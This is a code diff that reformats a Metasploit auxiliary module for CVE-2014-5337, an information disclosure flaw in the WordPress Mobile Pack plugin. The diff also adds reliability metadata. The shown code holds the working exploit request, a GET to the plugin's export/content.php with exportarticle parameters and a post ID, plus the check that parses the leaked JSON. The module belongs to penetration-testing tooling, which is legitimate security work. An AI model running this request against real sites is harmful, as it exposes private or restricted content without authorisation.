@@ -9,31 +9,38 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'WordPress Mobile Pack Information Disclosure Vulnerability',
-      'Description'    => %q{
-        This module exploits an information disclosure vulnerability in WordPress Plugin
-        "WP Mobile Pack" version 2.1.2, allowing to read files with privileges
-        information.
-      },
-      'References'     =>
-        [
-          ['CVE' , '2014-5337'],
+    super(
+      update_info(
+        info,
+        'Name' => 'WordPress Mobile Pack Information Disclosure Vulnerability',
+        'Description' => %q{
+          This module exploits an information disclosure vulnerability in WordPress Plugin
+          "WP Mobile Pack" version 2.1.2, allowing to read files with privileges
+          information.
+        },
+        'References' => [
+          ['CVE', '2014-5337'],
           ['WPVDB', '8107'],
           ['PACKETSTORM', '132750']
         ],
-      'Author'         =>
-        [
+        'Author' => [
           'Nitin Venkatesh', # Vulnerability Discovery
           'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module
         ],
-      'License'        => MSF_LICENSE
-    ))
+        'License' => MSF_LICENSE,
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         OptString.new('POSTID', [true, 'The post identification to read', '1'])
-      ])
+      ]
+    )
   end
 
   def check
@@ -45,11 +52,11 @@ class MetasploitModule < Msf::Auxiliary
 
     begin
       res = send_request_cgi(
-        'method'    => 'GET',
-        'uri'       => normalize_uri(wordpress_url_plugins, 'wordpress-mobile-pack', 'export', 'content.php'),
-        'vars_get'  => {
-          'content'   => 'exportarticle',
-          'callback'  => 'exportarticle',
+        'method' => 'GET',
+        'uri' => normalize_uri(wordpress_url_plugins, 'wordpress-mobile-pack', 'export', 'content.php'),
+        'vars_get' => {
+          'content' => 'exportarticle',
+          'callback' => 'exportarticle',
           'articleId' => "#{postid}"
         }
       )
@@ -60,10 +67,10 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     if res &&
-        res.code == 200 &&
-        res.body.length > 29 &&
-        res.headers['Content-Type'].include?('application/json') &&
-        !res.body.include?('"error":')
+       res.code == 200 &&
+       res.body.length > 29 &&
+       res.headers['Content-Type'].include?('application/json') &&
+       !res.body.include?('"error":')
 
       vprint_status('Enumerating...')
       res_clean = JSON.pretty_generate(temp)
